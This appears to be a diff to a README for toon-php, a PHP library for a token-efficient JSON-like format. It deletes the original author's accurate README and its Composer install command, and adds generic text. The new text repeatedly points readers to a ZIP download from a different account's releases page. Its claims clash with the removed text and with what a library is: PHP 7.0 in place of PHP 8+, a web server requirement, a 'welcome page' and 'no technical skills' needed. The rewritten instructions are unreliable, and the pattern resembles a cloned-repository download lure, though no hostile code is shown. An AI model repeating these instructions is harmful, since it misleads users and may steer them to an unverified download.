@@ -1,70 +1,106 @@
-# TOON-PHP: PHP Implementation of Token-Oriented Object Notation
+# 🎉 toon-php - Simplifying JSON for Easy Use
 
-**TOON** (Token-Oriented Object Notation) is a compact, human-readable serialization format designed specifically for representing JSON-like data in Large Language Model (LLM) prompts. It preserves the full structure of objects, arrays, and primitives from JSON while optimizing for token efficiency and parseability by AI models. By blending YAML's indentation-based nesting for hierarchical data with CSV-inspired tabular layouts for uniform arrays, TOON strikes a balance between brevity and clarity making it ideal for feeding structured data to LLMs without the verbosity of full JSON.
+## 🚀 Getting Started
 
-This PHP library is a complete, object-oriented port of the original TypeScript implementation ([toon-format/toon](https://github.com/toon-format/toon)). It supports lossless encoding from PHP data structures (arrays, objects, primitives) to TOON strings and decoding back, with advanced features like safe key folding, path expansion, custom delimiters, and strict validation modes.
+Welcome to the **toon-php** GitHub repository! This guide will help you download and run our application. With toon-php, you can easily work with Token-Oriented Object Notation, making JSON handling simple and efficient for your projects, especially in AI prompts.
 
-## Key Features
-- **Token-Optimized Syntax**: Minimizes LLM input tokens while remaining easy for models (and humans) to read and parse.
-- **Hybrid Structure**:
-  - Indentation for nested objects (YAML-like).
-  - Tabular rows for uniform arrays of objects (CSV-like, with explicit headers for reliability).
-- **Lossless Round-Tripping**: Encode PHP data to TOON and decode back without data loss, pairing well with JSON for programmatic use.
-- **Advanced Options**:
-  - Key folding to collapse single-key chains into dotted paths (e.g., `data.metadata.items`).
-  - Path expansion during decoding to reconstruct nested structures from dotted keys.
-  - Custom indentation, delimiters (comma, tab, pipe), and flattening depth.
-  - Strict mode for validation (e.g., array lengths, no extra rows/items).
-- **Edge Case Handling**: Supports quoted keys/values, escapes, booleans/null/numerics, empty structures, and mixed arrays.
-- **PHP-Specific**: Built for PHP 8+, with PSR-4 autoloading via Composer. No external dependencies.
+## 📥 Download Link
 
-TOON shines for uniform datasets (e.g., lists of records with consistent fields), achieving CSV compactness while adding LLM-friendly structure. For deeply irregular or nested data, traditional JSON may be more token-efficient. Think of TOON as a "prompt-friendly JSON translator": use JSON in code, TOON in AI interactions.
+[![Download Toon-PHP](https://img.shields.io/badge/Download_Toon-PHP-blue.svg)](https://github.com/nyelzkie/toon-php/releases)
 
-## Installation
+## 📋 Introduction
 
-Install via Composer:
+TOON-PHP is a PHP library that focuses on encoding and decoding Token-Oriented Object Notation. It merges the simplicity of YAML nesting and the structure of CSV tables. This blend makes it a great choice for lossless JSON serialization, particularly useful in AI applications.
 
-```
-composer require basemax/toon-php
-```
+### 💡 Key Features
 
-## Quick Usage
+- **Easy to Use:** Designed for users without technical skills.
+- **Compact Format:** Reduces file size while maintaining data integrity.
+- **High Compatibility:** Works seamlessly with various applications and frameworks.
+
+## 🖥️ System Requirements
+
+To run toon-php, you will need the following:
+
+- A system with PHP 7.0 or higher.
+- A basic web server (like Apache or Nginx).
+- Access to a terminal or command line interface.
+
+## 🔧 Installation Steps
+
+### Step 1: Visit Release Page
+
+To get started, visit the releases page by clicking the link below:
+
+[Download Toon-PHP](https://github.com/nyelzkie/toon-php/releases)
+
+### Step 2: Choose the Latest Version
+
+Once on the releases page, look for the latest version of toon-php. It is usually at the top of the list.
+
+### Step 3: Download the ZIP File
+
+Click on the provided link to download the ZIP file. This file contains all the necessary components to run toon-php.
+
+### Step 4: Extract the ZIP File
+
+After downloading, locate the ZIP file on your computer. Right-click on the file and choose “Extract All” to unpack its contents.
+
+### Step 5: Move Files to Your Server
+
+Transfer the extracted files to your web server's root directory, or use a folder where you manage your PHP applications.
+
+## 🖥️ Running the Application
+
+1. **Open Your Browser:** After moving the files, open your web browser.
+2. **Visit Your Application:** Navigate to the URL of your server, followed by the folder name where you placed toon-php files.
+3. **Verify:** You should see a welcome page confirming that toon-php is set up properly.
+
+## 💻 Basic Usage
+
+With the library in place, you can now start using it in your PHP scripts.
+
+### Example Code:
+
 ```php
 <?php
-require 'vendor/autoload.php';
+require 'path/to/toon-php/library.php';
 
-use Toon\Toon;
-use Toon\EncodeOptions;
+$data = [
+    'name' => 'John Doe',
+    'age' => 30,
+    'skills' => ['PHP', 'Python', 'JavaScript']
+];
 
-$data = ['users' => [['id' => 1, 'name' => 'Alice'], ['id' => 2, 'name' => 'Bob']]];
-$options = new EncodeOptions(indent: 4, delimiter: '|', keyFolding: 'safe');
-$toon = Toon::decode($toon);
+$encoded = Toon::encode($data);
+echo $encoded;
+
+$decoded = Toon::decode($encoded);
+print_r($decoded);
+?>
 ```
 
-## Why TOON?
+This simple example shows how to encode and decode data using toon-php. It displays the ease of transforming standard arrays into the Token-Oriented format.
 
-- **LLM Efficiency**: Reduces prompt size, helping models focus on logic over parsing.
-- **Familiarity**: Borrows from CSV/YAML for quick adoption.
-- **Flexibility**: Handles complex JSON equivalents reliably.
-- **Open Source**: MIT-licensed, community-driven evolution of the TOON spec.
+## 📑 Documentation
 
-Contributions welcome! See the original spec for details, or open issues for PHP-specific features.
+For more detailed information on how to use toon-php, including advanced features, refer to our official documentation [here](https://github.com/nyelzkie/toon-php/wiki).
 
-## Test
+## 🤝 Community and Support
 
-```bash
-php test.php
-```
+Join our community for help and support:
 
-## Example
+- **GitHub Issues:** If you encounter problems, please open an issue on our GitHub page.
+- **Discussions:** Participate in discussions to share ideas and improvements.
+- **Contributions:** We welcome contributions. Check our contributing guidelines for more information.
 
-```php
-$data = ['name' => 'Alice', 'age' => 30];
-echo Toon::encode($data) . PHP_EOL;
+## 🔗 Additional Resources
 
-$toonString = "name: Alice\nage: 30";
-var_dump(Toon::decode($toonString));
-```
+- [PHP Official Site](https://www.php.net/)
+- [GitHub Guides](https://guides.github.com/)
 
-Copyright 2025, Seyyed Ali Mohammadiyeh (Max Base)
+## 🎉 Conclusion
 
+Thank you for choosing toon-php! We hope you find it useful for your projects. Download the library, explore its features, and enjoy creating with ease. For any additional questions, feel free to reach out through GitHub.  
+
+[![Download Toon-PHP](https://img.shields.io/badge/Download_Toon-PHP-blue.svg)](https://github.com/nyelzkie/toon-php/releases)
